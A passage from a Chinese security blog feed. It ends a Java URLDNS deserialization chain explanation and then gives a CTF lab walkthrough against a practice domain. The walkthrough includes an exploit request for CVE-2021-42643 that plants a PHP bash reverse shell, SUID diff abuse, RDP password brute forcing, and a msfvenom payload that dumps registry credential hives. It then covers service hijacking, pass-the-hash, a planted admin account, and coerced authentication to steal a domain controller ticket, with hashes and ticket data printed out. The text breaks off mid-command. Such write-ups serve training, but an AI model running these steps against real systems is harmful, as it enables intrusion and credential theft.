存起来，就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;String, String&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">map.put(&quot;apple&quot;, &quot;苹果&quot;);</span><br><span class="line">System.out.println(map.get(&quot;apple&quot;)); // 苹果</span><br></pre></td></tr></table></figure><h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SilentURLStreamHandler为第一部分重写了的URLStreamHandler，重写了openConnection，getHostAddress的函数；<br>因为<strong>hashmap的put方法也会调用它们进行一次DNS解析请求</strong>，重写来覆盖掉原函数，避免在构造poyload的时候发起DNS请求，影响最后的判断。</p><h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><h3 id="核心调用流程"><a href="#核心调用流程" class="headerlink" title="核心调用流程"></a>核心调用流程</h3><p>下方为<strong>URLDNS 反序列化链</strong> 核心调用流程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">        ↓</span><br><span class="line">HashMap.hash(Object key)</span><br><span class="line">        ↓</span><br><span class="line">key.hashCode()   --&gt; java.net.URL.hashCode()</span><br><span class="line">        ↓</span><br><span class="line">URLStreamHandler.hashCode(URL u)</span><br><span class="line">        ↓</span><br><span class="line">URLStreamHandler.getHostAddress(URL u)</span><br><span class="line">        ↓</span><br><span class="line">InetAddress.getByName(String host)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来用上方提到的poc详细看该反序列化链的调用流程</p><h3 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap.readObject()"></a>HashMap.readObject()</h3><p>先ctrl+alt +b跳转到hashmap的实现代码<br><img src="https://cdn.jjjxx.top/img/URLDNS%E9%93%BE-20250318094246.png"></p><p>我们利用payload或者Poc生成序列化文件并把它传入存在反序列化漏洞的服务器上时，服务器就会对它进行序列化，<strong>当该类被反序列化时就会调用readObject()方法</strong></p><h4 id="readObject-介绍"><a href="#readObject-介绍" class="headerlink" title="readObject()介绍"></a>readObject()介绍</h4><p><strong>有基础不需要看</strong><br>readObject()方法可以理解为PHP中的魔术方法，在PHP中的<code>__wakeup()</code> 方法在 <code>unserialize()</code> 执行时会自动调用；在Java中，<code>readObject()</code> 方法在反序列化（<code>ObjectInputStream.readObject()</code>）时会自动执行</p><p>跟进hashmap()下的readObject方法<br><img src="https://cdn.jjjxx.top/img/URLDNS%E9%93%BE-20250318102703.png"></p><h3 id="HashMap-hash-Object-key"><a href="#HashMap-hash-Object-key" class="headerlink" title="HashMap.hash(Object key)"></a>HashMap.hash(Object key)</h3><p>往下滑，可以看到putVal()调用了hash(),并把键值key传入了，key也就是前方传入的dnslog的url</p><p><img src="https://cdn.jjjxx.top/img/URLDNS%E9%93%BE-20250318105154.png"></p><p><strong>putVal()就是put()的底层实现，put()就是一个外部接口</strong></p><h3 id="key-hashCode"><a href="#key-hashCode" class="headerlink" title="key.hashCode()"></a>key.hashCode()</h3><p>继续跟进hash(),可以看到又调用了<code>key.hashcode()</code>方法<br><img src="https://cdn.jjjxx.top/img/URLDNS%E9%93%BE-20250318105724.png"></p><p>当点击转到实现方法时，发现key是一个Object基类。<br>Object基类是所有类的父类，父类引用（Object key）调用方法时，根据实际对象类型调用子类实现。<br><img src="https://cdn.jjjxx.top/img/URLDNS%E9%93%BE-20250318110858.png"></p><p>因此需要跟进URL.hashcode()</p><h4 id="重写和多态介绍"><a href="#重写和多态介绍" class="headerlink" title="重写和多态介绍"></a>重写和多态介绍</h4><p><strong>有基础不需要看</strong></p><p>HashMap 的 key 是 Object 类型引用，但真正调用 hashCode()、equals() 方法时，是根据 实际对象类型 走子类的实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://example.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">key.hashCode(); <span class="comment">// 实际执行 URL.hashCode();重写+多态</span></span><br></pre></td></tr></table></figure><h3 id="URL-hashcode"><a href="#URL-hashcode" class="headerlink" title="URL.hashcode()"></a>URL.hashcode()</h3><p>继续跟进URL.hashcode()</p><p>可以直接打个URL,alt+左键跳转到URL类，再找一下hashcode()<br><img src="https://cdn.jjjxx.top/img/URLDNS%E9%93%BE-20250318112804.png"></p><p><img src="https://cdn.jjjxx.top/img/URLDNS%E9%93%BE-20250318113208.png"></p><p>可以看到如果hashcode是非1的值，if的条件就会满足，直接return的值。该条件说明已经计算过hash值了，会直接返回缓存值。</p><p><code>hashCode == -1</code> 时，代表还没有计算过哈希值，会调用handler.hashcode()进行第一次计算。<br>因此上方的payload中才会通过反射把hashcode的值设置成-1，否则就无法进行链子的下一个调用。</p><h4 id="hashcode-介绍"><a href="#hashcode-介绍" class="headerlink" title="hashcode()介绍"></a>hashcode()介绍</h4><p><strong>有基础不需要看</strong><br>每个对象都有自己的 <code>hashCode()</code>，这是一个返回 <strong>整数值</strong> 的方法。<br>这个返回值是对象的 <strong>哈希值</strong>，用来加速数据查找、比较等操作</p><p><strong>作用</strong></p><p><code>hashCode()</code> 返回一个整数，用作哈希表中的“索引”。</p><p>比如 <code>HashMap</code>，插入和查找 key 的时候：</p><ol><li>先调用 <code>key.hashCode()</code> 算出哈希值。</li><li>然后根据这个哈希值决定放到哪一个“桶”里（<code>table</code> 的索引）。</li><li>再在这个“桶”里通过 <code>equals()</code> 比较找到真正的 key。</li></ol><p> <strong>原理</strong></p><p>哈希表底层是一个数组，每个 key 根据哈希值决定放在哪个下标位置（index）。<br><code>hashCode()</code> 越分散，哈希表性能越好。</p><h3 id="URLStreamHandler-hashCode"><a href="#URLStreamHandler-hashCode" class="headerlink" title="URLStreamHandler.hashCode()"></a>URLStreamHandler.hashCode()</h3><p>跟进handler的hashCode(),发现<code>handler</code>是<code>URLStreamHandler</code>的实例,因此需要跟进<code>URLStreamHandler的hashCode()</code>。</p><p><img src="https://cdn.jjjxx.top/img/URLDNS%E9%93%BE-20250318115753.png"></p><p>同时我们看到hashcode的默认值为-1，但是<code>HashMap()的put()</code>时已经调用过一次<code>hashCode()</code>函数，<code>hashCode</code>的值会有缓存，因此需要上方的payload中才会通过反射把hashcode的值设置成-1，否则就无法进行链子的下一个调用。</p><p>并且payload也重写了<strong>URLStreamHandle</strong>r的getHostAddress，openConnection方法，防止在第一次put是触发DNS请求，影响探测效果。</p><p><strong>跟进URLStreamHandler的hashCode()</strong></p><p><img src="https://cdn.jjjxx.top/img/URLDNS%E9%93%BE-20250318142129.png"></p><p>第一部分代码相当于取出协议部分<br>第二部分的InetAddress addr &#x3D; getHostAddress(u);取出主机部分。尝试通过 <code>getHostAddress(u)</code> 获取 <code>InetAddress</code>（相当于解析 <code>URL</code> 的 IP 地址）。</p><p>发现它又调用了getHostAddress(),继续跟进。</p><h3 id="URLStreamHandler-getHostAddress"><a href="#URLStreamHandler-getHostAddress" class="headerlink" title="URLStreamHandler.getHostAddress"></a>URLStreamHandler.getHostAddress</h3><p>该方法又调用了InetAddress.getByName(),并传入主机名<br><img src="https://cdn.jjjxx.top/img/URLDNS%E9%93%BE-20250318143559.png"></p><h3 id="InetAddress-getByName"><a href="#InetAddress-getByName" class="headerlink" title="InetAddress.getByName"></a>InetAddress.getByName</h3><p><img src="https://cdn.jjjxx.top/img/URLDNS%E9%93%BE-20250318143906.png"></p><p>该方法对传入的主机名（<code>host</code>）解析出对应的 IP 地址（<code>InetAddress</code> 对象），从而发送了一次DNS请求。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Hashmap是反序列化的入口点，getByName是最后的利用点，本质就是想办法把头和尾串联起来；传入的key和把hashcode的值通过反射改为-1就是这条链的关键点。把他们串起来之后加上dnslog进行序列化处理,传入可能存在的漏洞点就可以进行测试了。</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java反序列化 </tag>
            
            <tag> Java反射 </tag>
            
            <tag> URLDNS链 </tag>
            
            <tag> 反序列化利用链详解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Delegation</title>
      <link href="/2025/02/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Delegation/"/>
      <url>/2025/02/19/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Delegation/</url>
      
        <content type="html"><![CDATA[<h1 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h1><ul><li>CVE-2021-42643</li><li>diff提权</li><li>rdp爆破</li><li>注册表提权</li><li>NTLM强制认证+非约束性委派</li></ul><h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p>拿到ip后，访问&#x2F;admin<br>存在弱口令 admin&#x2F;123456<br>登陆后查看版本，该版本存在<a href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9Egetshell">cve-2021-42643</a><br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218173502.png"></p><p>抓包利用，写一个弹shell的poyload，储存在php文件中；<code>.._d_</code>表示上级目录，这样可以把php文件上传到根目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1  </span><br><span class="line">Host: 192.168.31.96  </span><br><span class="line">Content-Length: 57  </span><br><span class="line">X-Requested-With: XMLHttpRequest  </span><br><span class="line">User-Agent: Mozilla/5.0  </span><br><span class="line">Content-Type: application/x-www-form-urlencoded;  </span><br><span class="line">Cookie: login_username=admin; login_password=357fce333f91905f3e7342d10e5a5ce4;  </span><br><span class="line">Connection: close  </span><br><span class="line">  </span><br><span class="line">sid=#data_d_.._d_.._d_.._d_a.php&amp;slen=693&amp;scontent=&lt;%3fphp+exec(&quot;/bin/bash+-c+&#x27;bash+-i+&gt;%26+/dev/tcp/vpsip/9999+0&gt;%261&#x27;&quot;)%3b%3f&gt;</span><br></pre></td></tr></table></figure><p>发包<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218174135.png"></p><p>访问该文件触发命令（访问前先在服务器监听9999端口）</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218174227.png"></p><p>得到shell</p><p>  由于不是高权限需要提权，查看suid看看有没有可以利用的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>发现一个diff,可以用来提权</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218174427.png"></p><p>查看flag01</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff --line-format=%L /dev/null /home/flag/flag01.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218174603.png"></p><p>得到flag01和提示<br>提示WIN19\Adrian和rockyou ，应该是用来rdp爆破的</p><h2 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h2><p>上传fscan和chisel<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218175103.png"></p><p>查看机器内网ip</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218175153.png"></p><p>扫描内网</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 172.22.4.0/24</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218175500.png"></p><p>得到内网信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.7 DC01</span><br><span class="line">172.22.4.19 FILESEVER</span><br><span class="line">172.22.4.36 </span><br><span class="line">172.22.4.45 WIN19</span><br></pre></td></tr></table></figure><h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><p>服务端监听<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218180910.png"></p><p>shell执行命令<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218181038.png"></p><p>搞完代理，扫描shell的ip发现该机器的3389端口开着</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218181156.png"></p><p>使用九头蛇或者crackmapexec爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 hydra -l win19\Adrian -P /usr/share/wordlists/rockyou.txt 172.22.4.45 rdp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.4.45 -u Adrian -p /usr/share/wordlists/rockyou.txt -d WIN19</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到账号密码，但是显示密码已过期<br>win19\Adrian babygirl1</p><p>使用smbpasswd远程更改密码，或者直接登录用户后直接修改密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbpasswd -r 10.0.0.15 -U &#x27;expired&#x27;</span><br></pre></td></tr></table></figure><p>远程桌面登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 rdesktop 172.22.4.45 -r disk:share=/home/kali/Desktop/tmp</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218183405.png"></p><p>登陆后发现有一个PrivescCheck 文件夹，PrivescCheck 是一个Windows 的提权工具，且是跑完了的，看它生成的 html 文件，发现有一个WSUS和注册表的危险配置</p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218183628.png"></p><p>发现用户可以修改名称为gupdate的注册表<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218183800.png"></p><h3 id="注册表提权"><a href="#注册表提权" class="headerlink" title="注册表提权"></a>注册表提权</h3><p>先用msf生成一个exe木马<br>该木马打开SYSTEM的cmd串口，并执行bat的命令，并把它转为exe文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec cmd=&#x27;C:\windows\system32\cmd.exe /c C:\users\Adrian\Desktop\nihao.bat &#x27; --platform windows -f exe-service &gt; nihao.exe</span><br></pre></td></tr></table></figure><p>nihao.bat的配置如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\Users\Adrian\Desktop\system</span><br><span class="line">reg save hklm\sam C:\Users\Adrian\Desktop\sam</span><br><span class="line">reg save hklm\security C:\Users\Adrian\Desktop\security</span><br></pre></td></tr></table></figure><p>修改注册表命令<br>通过修改gupdate的注册表项ImagePath 把他改为我们生成的木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:\Users\Adrian\Desktop\nihao.exe&quot; /f</span><br></pre></td></tr></table></figure><p>启动 gupdate 服务触发 msf 的exe命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start gupdate</span><br></pre></td></tr></table></figure><p>触发成功后，会在桌面生成三个文件</p><p>使用secretsdump解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py LOCAL -system system -sam sam -security security</span><br></pre></td></tr></table></figure><p>得到管理员和机器的hash<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218193604.png"></p><p>ptt登陆管理员</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4  python3 psexec.py administrator@172.22.4.45 -hashes &quot;aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab&quot; -codec gbk</span><br></pre></td></tr></table></figure><p>拿到45机器的权限，查看flag<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218195400.png"></p><h2 id="flag03-flag04"><a href="#flag03-flag04" class="headerlink" title="flag03 + flag04"></a>flag03 + flag04</h2><p>为方便后续操作添加一个本地管理员账户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user nihao nihao9! /add </span><br><span class="line">net localgroup administrators nihao9 /add</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218202510.png"></p><p>远程桌面连接上<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218203047.png"></p><p>使用探测bloodhound探测域环境，发现WIN19和DC都有非约束委派<br><strong>非约束委派：允许服务账户以用户的身份访问服务</strong></p><p>先下载文件，然后拉入bloodhound即可查看，机器的hash是上面三个文件中解密出来的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains bloodhound-python -u win19$ --hashes &quot;aad3b435b51404eeaad3b435b51404ee:bbd1d50b4689e93dc3b61babef482838&quot; -d xiaorang.lab -dc dc01.xiaorang.lab -c all --dns-tcp -ns 172.22.4.7 --auth-method ntlm --zip</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218203106.png"></p><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250219212636.png"></p><h3 id="非约束委派-NTLM强制认证打DC"><a href="#非约束委派-NTLM强制认证打DC" class="headerlink" title="非约束委派+NTLM强制认证打DC"></a>非约束委派+NTLM强制认证打DC</h3><p>使用Rubeus监听TGT</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218205852.png"></p><p>如果显示没有net3.5,使用下面命令安装<br><strong>安装net 3.5</strong><br><a href="https://gitcode.com/open-source-toolkit/a78e8/?utm_source=tools_gitcode&index=top&type=card&">sxs下载</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dism.exe /online /enable-feature /featurename:NetFX3 /Source:D:\sxs</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218205409.png"></p><p>  <a href="https://forum.butian.net/share/1944">强制认证</a><br>使用dfscoerce对域控强制认证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 dfscoerce.py -u &quot;win19$&quot; -hashes :bbd1d50b4689e93dc3b61babef482838 -d xiaorang.lab win19 172.22.4.7</span><br></pre></td></tr></table></figure><p>或者PetitPotam</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 PetitPotam.py -u &#x27;WIN19$&#x27; -hashes :2c05ad434d747b203a57565194891b38 -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab DC01.xiaorang.lab</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218210027.png"></p><p>认证后，Rubeus就可以监听到域控的TGT票据<br><img src="https://cdn.jjjxx.top/img/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0-20250218210045.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6Iki/0YqtJ7VWLHKsnlTAIaKBlKfxBHVuP+4PqtRoAUCDiLg6N9t3Rwd7h/FewEmuAxQV9Dx21LcSkyLnQc2d9WkO/91l93ImQt09Yq9qtWChPbLTWRfSeknqeW0o+M2GaMdOjv2TNFt/OwbvjcwEUddynvqY7cWQ/IQYnQSlGCQDSfIeFMu2Q6aSX1QIheHaK8Tcg6Qs4ythd4i2gtMSDkbeHvJYa/5rPn10P34b/DD/BFJaL3lgLHBA9Jfs4dG0Bi52x66nw8AjeNoFtlwtY7aX0fzC5H5kCTEp+nzXceBXPxd8o8One4txOhE8noytvKslbYXf+npX5p8RMHhH+rFXEg4CDJ+gfm47SpsoppD3p9fbElVU+A5Hbi/62gtxwpDSUdDodo4b3YLdDE16bcrcPjVXxY/caxSoQEml8msFjJ7rVK/0AOkfhkmL1piaMt6S9HvEHAkcw8D0Y5l/j0yqPQ7OwLgKuEqnPYGfiXU9efBHkEybMgZzzaAqSqKmB7jmwvnnLorxcxys3OPNmel19bASrCFTEcixwwpdg/qVkf87FrlWorbMBdTSMkLfGKn95mJnozVz03TccXzvzRyDPTF2UxWc9vW8IpsHM3EqisF/wjcgLC8ShCwRfFy9mRLKkb9p7UALN4NumrVBQFNRFO3l2MYaTShtP/VlHP2rHG+K2WcTx/n9ErcvGAH9ZppjcyfKmPHdhStHlPXiDaH1KD4mNhKz+duGs5yNIaskplKbM7RW3T1M7gzHbvc9GuQjPvyyffYkE3nBAZ4mSozupD1JtFcDBGmPnhcBSI7eu7Hc9Kr2YXdosH5MPtmcUi78VpdLbZTSIeqzVpSeNmpqHxnSqTX44xkh+CPMjrGppDQzx2BXFpgL18W69sS0fMYLu49npyZCuwjEl4IY2RXwhmlZ99RBPru/K1TLSlQnJ31KHdZjICrEmO68qaVv6t5NJi3YwK8jeC4xFhzU10YpJFDcRUnmGXF4ZE0PeUnt3PVSA/AdWZ6+du1DZlYpZ35DwFJnEHEaDwJpiRSSLWPHsoMlo/vodYQyClnJpPjFBbbDcJPsggQaUf+J4hjdxbRY++WT8gdoRuNE/2qpz15Y/4vcbsVOvhXJxtpaim1riXCskG7+VP54e4j/92dMWznaanHlAWlEqs9qPO9CMXbRv0INLlH8G923TftHCx5OMx2xVTMwgloFC8QJnNhY/ZfrRc/Ni4A1H51W8qY6ntSNDS23d3N9zdgKy0q2W7iTrGqTcXpQ0GBdmW/fw+XhWB44AdPTB0gULHkxljL5d3P8IpYZkEYi23eyRLHb06k+KevYfIwJ66hhrjzw2ve6tpKlOzd531Wy5Jarp2+t9CoHeD/6sSHmT5YFsnObLVcq3Bncv7tmtKX/EeCkZfUQ+DPGgUCET/+75mNzIDK0BnlNzzAjA88KsqSHBOvmjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCBJlggmcQ5lpHgQGNePX874w4YU1y+caNbV64KnuuMpSaEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDIxODA5MjkwMlqmERgPMjAyNTAyMTgxOTI5MDJapxEYDzIwMjUwMjI1MDkyOTAyWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==</span><br></pre></td></tr></table></figure><p>使用命令将TGT转为票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 